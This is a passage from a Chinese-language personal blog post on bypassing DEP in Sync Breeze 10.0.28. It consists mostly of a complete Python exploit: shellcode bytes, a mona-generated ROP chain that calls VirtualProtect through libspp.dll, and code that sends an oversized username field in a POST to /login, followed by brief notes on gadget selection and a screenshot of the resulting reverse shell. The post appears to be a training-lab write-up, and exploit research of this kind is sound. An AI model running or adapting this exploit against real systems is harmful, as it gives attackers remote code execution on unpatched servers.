class="string">b"\x14\xf0\x6e\xcc\x88\xab\xd8\xf2\x50\x2d\x22"</span></span><br><span class="line">shellcode += <span class="string">b"\xb6\x8e\x8e\xad\x37\x42\xaa\x89\x27\x9a\x33"</span></span><br><span class="line">shellcode += <span class="string">b"\x96\x13\x72\x62\x40\xcd\x34\xdc\x22\xa7\xee"</span></span><br><span class="line">shellcode += <span class="string">b"\xb3\xec\x2f\x76\xf8\x2e\x29\x77\xd5\xd8\xd5"</span></span><br><span class="line">shellcode += <span class="string">b"\xc6\x80\x9c\xea\xe7\x44\x29\x93\x15\xf5\xd6"</span></span><br><span class="line">shellcode += <span class="string">b"\x4e\x9e\x15\x35\x5a\xeb\xbd\xe0\x0f\x56\xa0"</span></span><br><span class="line">shellcode += <span class="string">b"\x12\xfa\x95\xdd\x90\x0e\x66\x1a\x88\x7b\x63"</span></span><br><span class="line">shellcode += <span class="string">b"\x66\x0e\x90\x19\xf7\xfb\x96\x8e\xf8\x29"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_rop_chain</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x1002f729</span>,   <span class="comment"># pop eax; ret;  :: libspp.dll</span></span><br><span class="line">      <span class="number">0x10168060</span>,   <span class="comment"># IAT KERNEL32!CreateFileA  libspp.dll</span></span><br><span class="line">      <span class="number">0x1014dc4c</span>,   <span class="comment"># mov eax,  [eax] ; ret ; (1 found)</span></span><br><span class="line">      <span class="number">0x100cb4d4</span>,   <span class="comment"># xchg eax, edx ; ret ; (1 found)     </span></span><br><span class="line">      <span class="number">0x1002f729</span>,   <span class="comment"># pop eax; ret;  :: libspp.dll</span></span><br><span class="line">      <span class="number">0xffffd070</span>,   <span class="comment"># offset = VirtualProtectStub - CreateFileA </span></span><br><span class="line">      <span class="number">0x1003f9f9</span>,   <span class="comment"># add eax, edx ; retn 0x0004 ; (1 found)</span></span><br><span class="line">      <span class="number">0x100121b5</span>,   <span class="comment"># xchg eax, esi ; cwde ; add bl, al ; mov eax, 0x02FAF080 ; ret ; (1 found)</span></span><br><span class="line">      <span class="number">0x41414141</span>,</span><br><span class="line"></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x10129305</span>,  <span class="comment"># POP EBP # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x10129305</span>,  <span class="comment"># skip 4 bytes [libspp.dll]</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x1012b413</span>,  <span class="comment"># POP EAX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x1009904c</span>,  <span class="comment"># NEG EAX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x100cb4d4</span>,  <span class="comment"># xchg edx, eax; ret;  :: libspp.dll</span></span><br><span class="line">      <span class="number">0x10104e93</span>,  <span class="comment">#push edx ; or al, 0x5E ; xor eax, eax ; pop ebx ; ret</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x1012b413</span>,  <span class="comment"># POP EAX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x10078216</span>,  <span class="comment"># NEG EAX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x100cb4d4</span>,  <span class="comment"># XCHG EAX,EDX # RETN [libspp.dll] </span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x1015d439</span>,  <span class="comment"># POP ECX # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x1020c95e</span>,  <span class="comment"># &amp;Writable location [libspp.dll]</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x10128eba</span>,  <span class="comment"># POP EDI # RETN [libspp.dll] </span></span><br><span class="line">      <span class="number">0x1010adf2</span>,  <span class="comment"># RETN (ROP NOP) [libspp.dll]</span></span><br><span class="line">      </span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x1014f55d</span>,  <span class="comment"># PUSHAD # RETN [libspp.dll]  </span></span><br><span class="line"></span><br><span class="line">      <span class="comment">#[---INFO:extras:---]</span></span><br><span class="line">      <span class="number">0x100bb515</span>,  <span class="comment"># ptr to 'push esp # ret ' [libspp.dll]</span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b''</span>.join(struct.pack(<span class="string">'&lt;I'</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets) </span><br><span class="line"></span><br><span class="line">rop_chain = create_rop_chain()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">  server = sys.argv[<span class="number">1</span>]</span><br><span class="line">  port = <span class="number">80</span></span><br><span class="line">  size = <span class="number">800</span></span><br><span class="line">  inputBuffer = <span class="string">b""</span></span><br><span class="line">  junk1 = <span class="string">b'\x41'</span>*<span class="number">780</span></span><br><span class="line">  <span class="comment">#eip = struct.pack("&lt;L",0xdeadbeef)</span></span><br><span class="line">  eip = struct.pack(<span class="string">"&lt;L"</span>,<span class="number">0x10023b22</span>) <span class="comment"># retn </span></span><br><span class="line">  offset = <span class="string">b'\x42'</span>*<span class="number">4</span></span><br><span class="line">  nops = <span class="string">b'\x90'</span>*<span class="number">32</span></span><br><span class="line">  junk2 = <span class="string">b'\x43'</span>*(<span class="number">1500</span>-len(shellcode)-len(rop_chain))</span><br><span class="line">  inputBuffer = junk1+eip+offset+rop_chain+nops+shellcode+junk2</span><br><span class="line">  content = <span class="string">b"username="</span> + inputBuffer + <span class="string">b"&amp;password=A"</span></span><br><span class="line"></span><br><span class="line">  buffer = <span class="string">b"POST /login HTTP/1.1\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Host: "</span> + server.encode() + <span class="string">b"\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Accept-Language: en-US,en;q=0.5\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Referer: http://10.11.0.22/login\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Connection: close\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Content-Type: application/x-www-form-urlencoded\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"Content-Length: "</span>+ str(len(content)).encode() + <span class="string">b"\r\n"</span></span><br><span class="line">  buffer += <span class="string">b"\r\n"</span></span><br><span class="line">  buffer += content</span><br><span class="line"></span><br><span class="line">  print(<span class="string">"Sending evil buffer..."</span>)</span><br><span class="line">  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">  s.connect((server, port))</span><br><span class="line">  s.send(buffer)</span><br><span class="line">  s.close()</span><br><span class="line">  </span><br><span class="line">  print(<span class="string">"Done!"</span>)</span><br><span class="line">  </span><br><span class="line"><span class="keyword">except</span> socket.error:</span><br><span class="line">  print(<span class="string">"Could not connect!"</span>)</span><br></pre></td></tr></table></figure>
+
+<p>用于覆盖<code>EIP</code>的值，开始选择的<code>ROP Gadget</code>地址属性为<code>PAGE_READ</code> ，导致<code>Memory Access Violation</code>，换一个地址属性为<code>PAGE_EXECUTE_READ</code>的即可，<code>mona</code>生成的<code>ROP Gadget</code>集合会标注是否为<code>PAGE_EXECUTE_READ</code>，这一点还是很不错的。</p>
+<p>喜闻乐见的反弹<code>shell</code>：</p>
+<p><img src="/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/rev_shell.png" alt="BOF"></p>
+<p>其实，也可以参照之前<a href="https://n0maj1o24.github.io/2022/05/01/Vulnserver-TRUN-Bypass-DEP-With-ROP-On-Win10/">《Vulnserver TRUN Bypass DEP With ROP On Win10》</a>介绍的那样，手动构造<code>ROP Chain</code>，不是很难。</p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>n0maj1o24
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/" title="Sync Breeze 10.0.28 bypass DEP">https://n0maj1o24.github.io/2022/05/28/Sync-Breeze-10-0-28-bypass-DEP/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Windows/" rel="tag"># Windows</a>
+              <a href="/tags/Stack-Based-Overflows/" rel="tag"># Stack Based Overflows</a>
+              <a href="/tags/DEP/" rel="tag"># DEP</a>
+              <a href="/tags/ROP/" rel="tag"># ROP</a>
+              <a href="/tags/SEH/" rel="tag"># SEH</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/28/Advantech-WebAccess-8-x-8-1-Multiple-Vulnerabilities/" rel="prev" title="Advantech WebAccess 8.x<8.1 Multiple Vulnerabilities">
+      <i class="fa fa-chevron-left"></i> Advantech WebAccess 8.x<8.1 Multiple Vulnerabilities
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="n0maj1o24"
+      src="/images/avatar.jpeg">
+  <p class="site-author-name" itemprop="name">n0maj1o24</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">41</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">9</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/n0maj1o24" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;n0maj1o24" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-nd.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">n0maj1o24</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : 'YxcX5Cznyp28BYsOhkgW4VH2-gzGzoHsz',
+      appKey     : 'DNYhYDu0OfL5c9gaMjQ1vbNC',
+      placeholder: "Just go go",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : true,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
